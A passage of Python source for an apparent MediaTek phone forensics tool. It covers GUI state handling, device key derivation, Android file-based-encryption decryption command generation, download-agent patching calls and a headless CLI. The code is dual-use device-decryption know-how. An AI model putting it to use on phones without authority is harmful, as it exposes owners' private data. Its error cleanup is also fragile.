            self.sb.setStyleSheet("background:#5a0000;color:#ff4040;")
            self.status_label.setStyleSheet("color:#ff4040;font-size:11px;min-width:200px;")
            self.status_label.setText("State: CRITICAL — Audit vault unwritable")
            QMessageBox.critical(
                self, "CRITICAL: Audit Vault Failure",
                f"The forensic audit vault could not be written:\n{msg}\n\n"
                "The Chain of Custody is NOT being backed to disk. "
                "Check permissions, disk space, or antivirus interference."
            )

        def _update_state_machine(self):
            """v12.0: Dynamically enable/disable buttons based on strict forensic state.
            DETECTED   → raw inputs present (log text or files loaded)
            PROFILED   → HCM populated from binary analysis
            VALIDATED  → derivation succeeded with non-placeholder keys
            READY      → all prerequisites for execution met
            """
            # Derive Keys: requires DETECTED (log text present) or files loaded
            has_input = bool(self.input_text.toPlainText().strip()) or bool(self._loaded_partitions)
            self.derive_btn.setEnabled(has_input)

            # Save: requires VALIDATED (derivation succeeded)
            self.save_btn.setEnabled(
                self._forensic_state in (ForensicState.VALIDATED, ForensicState.READY)
                and self._last_result is not None
            )

            # v12.5: DecryptionTab is 100% independent of HCM.is_ready() / chip_id.
            # The ONLY HCM-based block is hardware_wrapped_keys (physically impossible).
            hcm_hw_wrapped = self.decrypt_tab._update_hcm_warning()
            if not hcm_hw_wrapped:
                # DecryptionTab Generate: needs image + (manual keys OR derived keys)
                #   REALITY: analyst may only have a userdata dump and pasted keys.
                #   No chip_id, tee_type, or ANY HCM field is required.
                has_img = bool(self.decrypt_tab.img_edit.text().strip())
                has_manual_keys = (
                    bool(self.decrypt_tab.ce_edit.text().strip())
                    or bool(self.decrypt_tab.de_edit.text().strip())
                )
                has_derived_keys = self._last_result is not None
                can_generate = has_img and (has_manual_keys or has_derived_keys)
                self.decrypt_tab.gen_btn.setEnabled(can_generate)

                # v12.5: DecryptionTab Execute/Copy/Export — enabled IF commands exist.
                #   Completely independent of global READY state or HCM population.
                has_cmds = bool(self.decrypt_tab._last_cmd_set)
                self.decrypt_tab.exec_btn.setEnabled(has_cmds)
                self.decrypt_tab.copy_btn.setEnabled(has_cmds)
                self.decrypt_tab.export_btn.setEnabled(has_cmds)

            # Status label reflects forensic state only.
            # v12.5: Removed hcm_ready dependency so offline analysts aren't misled.
            state_colors = {
                ForensicState.DETECTED:  ("#808080", "DETECTED  — load data"),
                ForensicState.PROFILED:  ("#e0a060", "PROFILED  — analysis complete"),
                ForensicState.VALIDATED: ("#60d0ff", "VALIDATED — review keys"),
                ForensicState.READY:     ("#60ff80", "READY     — execute"),
            }
            color, text = state_colors.get(self._forensic_state, ("#808080", "UNKNOWN"))
            self.status_label.setStyleSheet(f"color:{color};font-size:11px;min-width:200px;")
            self.status_label.setText(f"State: {text}")

        def _on_decrypt_ready(self):
            """v12.0 — Callback from DecryptionTab when forensic commands are generated.
            Transitions state to READY and logs the event."""
            if self._forensic_state.value < ForensicState.READY.value:
                self._forensic_state = ForensicState.READY
            # Log command generation to Forensic Journal
            img = self.decrypt_tab.img_edit.text().strip()
            self._forensic_journal.record(
                event_type="COMMAND_GENERATION",
                file_path=img or "unknown",
                notes="Android FBE forensic decryption commands generated"
            )
            self.journal_text.setPlainText(self._forensic_journal.to_text())
            self._update_state_machine()
            self.sb.showMessage("Forensic commands generated — State: READY")

        def _on_derive(self):
            log_text = self.input_text.toPlainText().strip()
            legacy = self.legacy_cb.isChecked()
            pad_mode = "zero" if "Zero" in self.mode_combo.currentText() else "pkcs7"
            manual_meid = self.manual_meid_input.text().strip()
            manual_chip = self.manual_chip_input.text().strip()
            self.progress.setVisible(True)
            self.derive_btn.setEnabled(False)
            self.status_label.setText("Running derivation…")
            self._worker = self.DerivationWorker(
                log_text, legacy, pad_mode, manual_meid, manual_chip, dict(self._loaded_partitions)
            )
            self._worker.finished.connect(self._on_derive_finished)
            self._worker.error.connect(self._on_derive_error)
            self._worker.start()

        def _on_derive_finished(self, result, json_text, warnings, debug_lines):
            self.progress.setVisible(False)
            self.derive_btn.setEnabled(True)
            self._last_result = result
            self._debug_lines = debug_lines
            self.output_text.setPlainText(json_text)

            # v12.0: Populate HCM from derivation result (hard proof from log parsing)
            self._populate_hcm_from_derivation(result)

            # v12.0: State transition — if any non-placeholder keys, move to VALIDATED
            has_real_keys = any(
                isinstance(v, str) and len(v) >= 32 and not v.startswith("00000000")
                for v in result.values()
            )
            if has_real_keys and self._forensic_state.value < ForensicState.VALIDATED.value:
                self._forensic_state = ForensicState.VALIDATED

            # v12.0: Log derivation to Forensic Journal
            chip = result.get("_chip_id", "Unknown")
            meid = result.get("MTK_ME_ID", "")[:32]
            self._forensic_journal.record(
                event_type="KEY_DERIVATION",
                file_path="memory://derived_keys",
                notes=f"Chip: {chip}  |  ME_ID: {meid}  |  Warnings: {len(warnings)}"
            )
            self.journal_text.setPlainText(self._forensic_journal.to_text())
            if warnings:
                self.status_label.setText(f"Done — {len(warnings)} warning(s)")
            else:
                self.status_label.setText("Done")
            self.save_btn.setEnabled(True)
            # Update chip labels
            for k, v in result.items():
                if k in self._chip_labels:
                    self._chip_labels[k].setText(str(v) if v else "—")
            # Add to history tree
            ts = result.get("_timestamp", "")
            item = QTreeWidgetItem([ts, chip, meid])
            self._hist_tree.insertTopLevelItem(0, item)
            self.sb.showMessage(f"Derived keys for {chip}  |  ME_ID {meid}")
            # v12.0: Refresh state machine
            self._update_state_machine()

        def _populate_hcm_from_derivation(self, result: dict):
            """v12.0 — Populate HCM from derivation result dict.
            Uses ONLY fields that came from hard binary parsing, not heuristics."""
            hcm = self._hcm
            chip = result.get("_chip_id", "")
            if chip:
                hcm.set_field("chip_id", chip, "generate_keys_json: chip_id from log parsing")
            chip_name = result.get("_chip_name", "")
            if chip_name:
                hcm.set_field("chip_name", chip_name, "generate_keys_json: chip_name from log parsing")
            hw_code = result.get("_hw_code", 0)
            if hw_code:
                hcm.set_field("hw_code", int(hw_code), "generate_keys_json: hw_code from log parsing")
            # If we derived real keys and the device is Samsung, infer Knox Vault
            if result.get("is_samsung"):
                hcm.set_field("knox_vault_present", True,
                              "generate_keys_json: Samsung device detected from log")

        def _on_derive_error(self, msg: str):
            self.progress.setVisible(False)
            self.derive_btn.setEnabled(True)
            QMessageBox.critical(self, "Derivation Error", msg)
            self.status_label.setText("Error")

        def _on_save(self):
            if not self._last_result:
                return
            fmt = self.export_combo.currentText()
            filters = {
                "JSON": "JSON files (*.json)",
                "TXT (Plain)": "Text files (*.txt)",
                "CSV": "CSV files (*.csv)",
            }
            fp, _ = QFileDialog.getSaveFileName(self, "Save Results", str(Path.home()), filters.get(fmt, "All Files (*)"))
            if not fp:
                return
            try:
                if fmt == "JSON":
                    display = {k: v for k, v in self._last_result.items() if not k.startswith("_")}
                    Path(fp).write_text(json.dumps(display, indent=2, ensure_ascii=False), encoding="utf-8")
                elif fmt == "TXT (Plain)":
                    lines = [f"{k}: {v}" for k, v in self._last_result.items() if not k.startswith("_")]
                    Path(fp).write_text("\n".join(lines), encoding="utf-8")
                elif fmt == "CSV":
                    buf = StringIO()
                    writer = csv.writer(buf)
                    writer.writerow(["Key", "Value"])
                    for k, v in self._last_result.items():
                        if not k.startswith("_"):
                            writer.writerow([k, v])
                    Path(fp).write_text(buf.getvalue(), encoding="utf-8")
                self.sb.showMessage(f"Saved to {Path(fp).name}")
            except Exception as e:
                QMessageBox.critical(self, "Save Error", str(e))

        def _on_debug(self):
            if not self._debug_lines:
                QMessageBox.information(self, "Parse Debug", "No debug info available yet. Run Derive Keys first.")
                return
            dlg = QDialog(self)
            dlg.setWindowTitle("Parse Debug")
            dlg.setMinimumSize(900, 600)
            ly = QVBoxLayout(dlg)
            te = QTextEdit()
            te.setReadOnly(True)
            te.setPlainText("\n".join(self._debug_lines))
            ly.addWidget(te)
            bb = QDialogButtonBox(QDialogButtonBox.StandardButton.Close)
            bb.rejected.connect(dlg.reject)
            ly.addWidget(bb)
            dlg.exec()

def _cli_analyze(path: str, journal: ForensicJournal) -> dict:
    """v13.0 — Run the full forensic analysis pipeline in headless CLI mode.
    v13.0 FIX: Opens a single mmap and passes it to all engines (they expect
    bytes-like objects, not str paths). mmap is guaranteed closed in finally.
    v13.0 FIX: 0-byte guard + gc.collect() before close prevents BufferError."""
    results: dict = {}
    mm = None
    try:
        with open(path, "rb") as f:
            try:
                mm = mmap.mmap(f.fileno(), _get_real_size(f.fileno()), access=mmap.ACCESS_READ)
            except ValueError as e:
                if "empty file" in str(e).lower():
                    print("[ERROR] FILE_EMPTY — cannot analyze empty dump.", file=sys.stderr)
                    results["error"] = "FILE_EMPTY"
                    return results
                raise
            # Hash
            file_hash = hashlib.sha256(mm).hexdigest()
            results["sha256"] = file_hash
            print(f"[HASH] {file_hash}  {path}")
            journal.record("CLI_HASH", path, notes=file_hash)

            # Metadata analysis
            mm.seek(0)
            meta_res = OmniMTK_Weaponizer.MetadataPartitionAnalyzer.analyze(mm)
            if meta_res.get("status") != "NO_MATCH":
                results["metadata"] = meta_res
                print(f"[META] {meta_res.get('status')}  fscrypt={meta_res.get('fscrypt_policy_str','?')}")
                journal.record("CLI_METADATA", path, notes=meta_res.get("status","?"))

            # TEE analysis
            mm.seek(0)
            tee_res = OmniMTK_Weaponizer.TEEImageAnalyzer.analyze(mm)
            if tee_res.get("status") != "NO_MATCH":
                results["tee"] = tee_res
                print(f"[TEE ] {tee_res.get('status')}  tee_type={tee_res.get('tee_type','?')}")
                journal.record("CLI_TEE", path, notes=tee_res.get("status","?"))

            # DA patching analysis
            mm.seek(0)
            da_res = OmniMTK_Weaponizer.DAPatcherEngine.patch_da(mm, arch="AUTO")
            if da_res.get("status") != "ERROR_TOO_SMALL":
                results["da_patch"] = da_res
                print(f"[DA  ] {da_res.get('status')}  arch={da_res.get('detected_arch','?')}")
                journal.record("CLI_DA", path, notes=da_res.get("status","?"))
    finally:
        if mm is not None:
            del file_hash, meta_res, tee_res, da_res
            gc.collect()
            mm.close()
    return results


def _cli_hash(path: str, journal: ForensicJournal) -> str:
    """v13.0 — Compute SHA-256 hash and emit vault log in CLI mode.
    v13.0 FIX: Guarantee mmap.close() in finally + gc.collect() to prevent BufferError."""
    mm = None
    h = ""
    try:
        with open(path, "rb") as f:
            try:
                mm = mmap.mmap(f.fileno(), _get_real_size(f.fileno()), access=mmap.ACCESS_READ)
            except ValueError as e:
                if "empty file" in str(e).lower():
                    print("[ERROR] FILE_EMPTY — cannot hash empty dump.", file=sys.stderr)
                    return ""
                raise
            h = hashlib.sha256(mm).hexdigest()
    finally:
        if mm is not None:
            gc.collect()
            mm.close()
    print(h)
    journal.record("CLI_HASH", path, notes=h)
    return h


def main():
    # v13.0 FIX: 32-bit Python cannot mmap multi-GB forensic images.
    if struct.calcsize("P") * 8 < 64:
        print(
            "CRITICAL: OmniMTK Forensic Suite requires a 64-bit Python environment "
            "to map multi-GB forensic images. 32-bit detected.",
            file=sys.stderr,
        )
        sys.exit(1)

    parser = argparse.ArgumentParser(
        prog="omnimtk",
        description="OmniMTK Forensic Suite v13.0 — Ironclad Environment CLI & GUI"
    )
    parser.add_argument("--cli", action="store_true",
                        help="Force CLI mode (no GUI)")
    parser.add_argument("--analyze", metavar="FILE",
                        help="Run forensic analysis on FILE and print results")
    parser.add_argument("--hash", metavar="FILE",
                        help="Compute SHA-256 of FILE and print to stdout")
    parser.add_argument("--output", metavar="FILE", default=None,
                        help="JSON output path for --analyze (default: session-isolated)")
    args = parser.parse_args()

    cli_mode = args.cli or not HAS_QT
    if cli_mode:
        journal = ForensicJournal()
        results: dict = {}
        if args.hash:
            _cli_hash(args.hash, journal)
        if args.analyze:
            results = _cli_analyze(args.analyze, journal)
            # v13.0 FIX: Session-isolate default JSON to prevent concurrent corruption.
            output_path = args.output
            if output_path is None:
                ts = time.strftime("%Y%m%d_%H%M%S")
                pid = os.getpid()
                output_path = f"omnimtk_cli_results_{ts}_{pid}.json"
            try:
                with open(output_path, "w", encoding="utf-8") as outf:
                    json.dump(results, outf, indent=2, ensure_ascii=False)
                print(f"[INFO] Results written to {output_path}")
            except OSError as write_err:
                # v13.0 FIX: Write-blocked USB / read-only mount — never lose the data.
                print(
                    f"[CRITICAL WARNING] Write-blocked or permission denied for "
                    f"'{output_path}': {write_err}\n"
                    f"Dumping JSON to stdout so the investigation is not lost:",
                    file=sys.stderr,
                )
                json.dump(results, sys.stdout, indent=2, ensure_ascii=False)
                print()
        if not args.hash and not args.analyze:
            parser.print_help()
        sys.exit(0)

    # GUI mode
    app = QApplication(sys.argv)
    DarkPalette.apply(app)
    win = MTKKeyToolWindow()
    win.show()
    sys.exit(app.exec())

if __name__ == "__main__":
    main()